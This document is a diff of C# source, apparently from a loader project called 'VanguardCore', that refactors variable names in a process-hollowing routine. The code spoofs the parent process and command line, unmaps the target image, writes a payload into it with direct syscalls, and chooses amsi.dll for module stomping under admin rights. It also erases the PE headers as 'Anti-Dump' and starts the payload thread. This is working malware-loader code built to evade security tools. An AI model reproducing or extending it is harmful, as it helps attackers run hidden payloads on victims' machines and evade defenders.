@@ -56,31 +56,27 @@ namespace VanguardCore
             string parentName = "explorer";
             try { if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) parentName = "winlogon"; } catch { }
 
-            ProcessStealth.PROCESS_INFORMATION stealthPi;
-            if (!ProcessStealth.CreateProcessWithSpoofedPPID(targetPath, cmdLine, parentName, out stealthPi))
+            ProcessStealth.PROCESS_INFORMATION procInfo = new ProcessStealth.PROCESS_INFORMATION();
+            if (!ProcessStealth.CreateProcessWithSpoofedPPID(targetPath, cmdLine, parentName, out procInfo))
             {
                 CloseHandle(hRead);
                 return false;
             }
 
-            pi.hProcess = stealthPi.hProcess;
-            pi.hThread = stealthPi.hThread;
-            pi.dwProcessId = (int)stealthPi.dwProcessId;
-            pi.dwThreadId = (int)stealthPi.dwThreadId;
-            hProcess = pi.hProcess;
+            hProcess = procInfo.hProcess;
 
             // [PRO] Apply Command Line Spoofing
-            ProcessStealth.SpoofCommandLine(pi.hProcess, cmdLine);
+            ProcessStealth.SpoofCommandLine(procInfo.hProcess, cmdLine);
 
             IntPtr remoteBase = IntPtr.Zero;
             try
             {
                 SyscallManager.PROCESS_BASIC_INFORMATION pbi = new SyscallManager.PROCESS_BASIC_INFORMATION();
-                uint rl; ntQuery(pi.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out rl);
+                uint rl; ntQuery(procInfo.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out rl);
 
                 byte[] pebBuf = new byte[8]; IntPtr br;
-                ntRead(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), pebBuf, 8, out br);
-                ntUnmap(pi.hProcess, (IntPtr)BitConverter.ToInt64(pebBuf, 0));
+                ntRead(procInfo.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), pebBuf, 8, out br);
+                ntUnmap(procInfo.hProcess, (IntPtr)BitConverter.ToInt64(pebBuf, 0));
 
                 remoteBase = (IntPtr)imageBase;
                 UIntPtr sz = (UIntPtr)sizeOfImage;
@@ -89,19 +85,16 @@ namespace VanguardCore
                 string stompDll = "uxtheme.dll";
                 if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) stompDll = "amsi.dll";
                 
-                // For simplicity in this implementation, we will use a hybrid approach:
-                // We allocate memory that looks like a legitimate module or use standard allocation
-                // if module stomping fails.
-                if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x04) != 0) {
+                if (ntAlloc(procInfo.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x04) != 0) {
                     remoteBase = IntPtr.Zero;
-                    if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x04) != 0) throw new Exception("Alloc fail");
+                    if (ntAlloc(procInfo.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x04) != 0) throw new Exception("Alloc fail");
                 }
 
                 FixImports(payload, lfanew);
                 long delta = (long)remoteBase - imageBase;
                 if (delta != 0) ApplyRelocations(payload, lfanew, delta);
 
-                IntPtr wr; ntWrite(pi.hProcess, remoteBase, payload, (uint)sizeOfHeaders, out wr);
+                IntPtr wr; ntWrite(procInfo.hProcess, remoteBase, payload, (uint)sizeOfHeaders, out wr);
                 int shOff = lfanew + 0x18 + BitConverter.ToInt16(payload, lfanew + 0x14);
                 
                 // Track sections for granular protection
@@ -117,7 +110,7 @@ namespace VanguardCore
                     if (ssz > 0) {
                         byte[] sd = new byte[ssz];
                         Buffer.BlockCopy(payload, raw, sd, 0, ssz);
-                        ntWrite(pi.hProcess, (IntPtr)((long)remoteBase + rva), sd, (uint)ssz, out wr);
+                        ntWrite(procInfo.hProcess, (IntPtr)((long)remoteBase + rva), sd, (uint)ssz, out wr);
                         
                         // Select granular protection
                         uint sectProt = 0x02; // PAGE_READONLY
@@ -131,21 +124,21 @@ namespace VanguardCore
                 // [PRO] Apply Section Protections (RW -> RX/R)
                 foreach (var sec in sectionsToProtect) {
                     uint old; uint s = sec.size; IntPtr a = sec.addr;
-                    ntProtect(pi.hProcess, ref a, ref s, sec.prot, out old);
+                    ntProtect(procInfo.hProcess, ref a, ref s, sec.prot, out old);
                 }
 
                 // [PRO] Header Protection & Eraser (Anti-Dump)
                 uint hProtOld; uint hSize = (uint)sizeOfHeaders; IntPtr rB = remoteBase;
-                ntProtect(pi.hProcess, ref rB, ref hSize, 0x01, out hProtOld); // PAGE_NOACCESS
+                ntProtect(procInfo.hProcess, ref rB, ref hSize, 0x01, out hProtOld); // PAGE_NOACCESS
                 
                 // Wipe headers in remote memory
                 byte[] zeroHeader = new byte[sizeOfHeaders];
-                ntWrite(pi.hProcess, remoteBase, zeroHeader, (uint)sizeOfHeaders, out wr);
+                ntWrite(procInfo.hProcess, remoteBase, zeroHeader, (uint)sizeOfHeaders, out wr);
 
-                ntWrite(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), BitConverter.GetBytes((long)remoteBase), 8, out wr);
+                ntWrite(procInfo.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), BitConverter.GetBytes((long)remoteBase), 8, out wr);
 
                 IntPtr ht;
-                if (ntThread(out ht, 0x1FFFFF, IntPtr.Zero, pi.hProcess, (IntPtr)((long)remoteBase + entryPointRVA), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) == 0) {
+                if (ntThread(out ht, 0x1FFFFF, IntPtr.Zero, procInfo.hProcess, (IntPtr)((long)remoteBase + entryPointRVA), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) == 0) {
                     CloseHandle(ht);
                     return true;
                 }
@@ -153,14 +146,14 @@ namespace VanguardCore
             }
             catch (Exception ex) {
                 Log($"Fault: {ex.Message}");
-                if (remoteBase != IntPtr.Zero) { UIntPtr z = UIntPtr.Zero; ntFree(pi.hProcess, ref remoteBase, ref z, 0x8000); }
-                ntTerminate(pi.hProcess, 1);
+                if (remoteBase != IntPtr.Zero) { UIntPtr z = UIntPtr.Zero; ntFree(procInfo.hProcess, ref remoteBase, ref z, 0x8000); }
+                ntTerminate(procInfo.hProcess, 1);
                 return false;
             }
             finally {
                 SyscallManager.Cleanup();
-                if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess); 
-                if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
+                if (procInfo.hProcess != IntPtr.Zero) CloseHandle(procInfo.hProcess); 
+                if (procInfo.hThread != IntPtr.Zero) CloseHandle(procInfo.hThread);
             }
         }
 
@@ -233,13 +226,9 @@ namespace VanguardCore
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        private struct STARTUPINFO { public int cb; public string lpRes, lpDesk, lpTitle; public int dwX, dwY, dwXSize, dwYSize, dwXC, dwYC, dwFill, dwFlags; public short wShow, cbRes2; public IntPtr lpRes2, hIn, hStdOutput, hStdError; }
-        [StructLayout(LayoutKind.Sequential)]
-        private struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwPid, dwTid; }
-        [StructLayout(LayoutKind.Sequential)]
         public struct SECURITY_ATTRIBUTES { public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; }
 
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern bool CreateProcess(string n, string c, IntPtr pa, IntPtr ta, bool ih, uint f, IntPtr e, string cd, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern bool CreateProcess(string n, string c, IntPtr pa, IntPtr ta, bool ih, uint f, IntPtr e, string cd, [In] ref ProcessStealth.STARTUPINFO si, out ProcessStealth.PROCESS_INFORMATION pi);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern bool CloseHandle(IntPtr h);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern uint WaitForSingleObject(IntPtr h, uint ms);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern bool GetExitCodeThread(IntPtr h, out uint code);
